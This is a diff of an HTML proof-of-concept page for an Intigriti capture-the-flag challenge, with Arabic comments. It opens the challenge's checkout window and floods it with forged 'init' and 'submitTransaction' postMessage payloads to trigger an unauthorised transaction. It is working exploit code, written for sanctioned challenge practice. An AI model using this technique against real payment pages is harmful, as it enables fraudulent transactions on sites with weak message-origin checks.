@@ -3,30 +3,135 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PoC</title>
+    <title>PoC - Intigriti Challenge</title>
+    <style>
+        body { 
+            font-family: Arial, sans-serif; 
+            padding: 20px; 
+            background: #f5f5f5;
+        }
+        .status {
+            background: white;
+            padding: 15px;
+            border-radius: 5px;
+            margin-bottom: 20px;
+            border-left: 4px solid #00FF88;
+        }
+        button {
+            background: #00FF88;
+            color: #050A0E;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-weight: bold;
+            margin-top: 10px;
+        }
+        button:hover {
+            background: #00D4FF;
+        }
+    </style>
 </head>
 <body>
+    <div class="status" id="status">
+        <h3>🔍 Intigriti Challenge PoC</h3>
+        <p>انقر على الزر أدناه لبدء الهجوم...</p>
+    </div>
+
+    <button onclick="startAttack()">🚀 بدء الهجوم</button>
+
     <script>
         const challengeUrl = 'https://challenge-0126.intigriti.io';
-        const currency = '1337COIN'; 
-        const yourAddress = "VeryHacker";
-        const amount = 3; 
+        
+        // ✅ **التصحيح الأول**: اسم العملة الصحيح بناءً على الكود
+        // في currencyIcons: '1337COIN' (بأحرف كبيرة)، لكن السيرفر قد يتوقع '1337coin'
+        // جرب الاثنين أو تحقق مما يتوقعه السيرفر
+        const currency = '1337COIN';  // أو '1337coin'
+        const amount = 1;
 
-        const checkoutWindow = window.open(challengeUrl + '/checkout.html?currency=' + currency + '&price=1');
+        function updateStatus(message) {
+            document.getElementById('status').innerHTML += `<p>${message}</p>`;
+        }
 
-        setTimeout(() => {
-            checkoutWindow.postMessage({
-                type: 'submitTransaction',
-                transaction: {
-                    toAddress: yourAddress, 
-                    currency: '1337COIN',
-                    amount: 1
+        async function startAttack() {
+            updateStatus('⏳ جاري بدء الهجوم...');
+            
+            // ✅ **التصحيح الثاني**: فتح النافذة بعد تفاعل المستخدم
+            // هذه طريقة لتجنب حجب البوب أب
+            const checkoutWindow = window.open(
+                challengeUrl + '/checkout.html?currency=' + currency + '&price=1',
+                'checkout'
+            );
+            
+            if (!checkoutWindow) {
+                updateStatus('❌ تم حجب النافذة المنبثقة. يرجى السماح بالبوب أب لهذا الموقع.');
+                return;
+            }
+            
+            updateStatus('✅ تم فتح صفحة الدفع...');
+            
+            // ✅ **التصحيح الثالث**: الانتظار حتى تحميل الصفحة
+            // استخدم EventListener بدلاً من setTimeout فقط
+            let attempts = 0;
+            const maxAttempts = 30; // 30 محاولة خلال 15 ثانية
+            
+            const checkPageLoaded = setInterval(() => {
+                attempts++;
+                
+                try {
+                    // ✅ **التصحيح الرابع**: إرسال رسالة init أولاً
+                    // كما يفعل checkout.html الحقيقي
+                    checkoutWindow.postMessage({
+                        type: 'init',
+                        currency: currency,
+                        amount: amount,
+                        price: 1
+                    }, '*');
+                    
+                    updateStatus(`📤 أرسلت رسالة init (المحاولة ${attempts})`);
+                    
+                    // ✅ **التصحيح الخامس**: بعد init، انتظر ثم أرسل submitTransaction
+                    setTimeout(() => {
+                        checkoutWindow.postMessage({
+                            type: 'submitTransaction',
+                            transaction: {
+                                currency: currency,
+                                amount: amount,
+                                // العنوان غير مهم في هذا السياق
+                                toAddress: '1337coin_receiver'
+                            }
+                        }, '*');
+                        
+                        updateStatus('📤 أرسلت رسالة submitTransaction');
+                    }, 1000);
+                    
+                } catch (e) {
+                    updateStatus(`⚠️ خطأ في التواصل مع الصفحة: ${e.message}`);
                 }
-            }, '*');
-                        setTimeout(() => {
-                checkoutWindow.close();
-            }, 2000);
-        }, 10000); 
+                
+                if (attempts >= maxAttempts) {
+                    clearInterval(checkPageLoaded);
+                    updateStatus('⏰ انتهت محاولات الاتصال.');
+                    
+                    // ✅ **التصحيح السادس**: أبقِ النافذة مفتوحة للمراقبة
+                    setTimeout(() => {
+                        updateStatus('👀 تحقق من نافذة الدفع لرؤية الفلاج...');
+                        // اقتراح: افتح وحدة التحكم للمراقبة
+                        updateStatus('💡 افتح Console (F12) لمشاهدة الرسائل والأخطاء');
+                    }, 3000);
+                }
+            }, 500); // حاول كل 500 مللي ثانية
+        }
+        
+        // ✅ **التصحيح السابع**: استمع للرسائل المرتجعة للتصحيح
+        window.addEventListener('message', function(event) {
+            // كن حذرًا: تأكد من المصدر في البيئة الحقيقية
+            console.log('📩 رسالة مستلمة:', event.data);
+            
+            if (event.data && event.data.type) {
+                updateStatus(`📩 رسالة من checkout: ${event.data.type}`);
+            }
+        });
     </script>
 </body>
 </html>
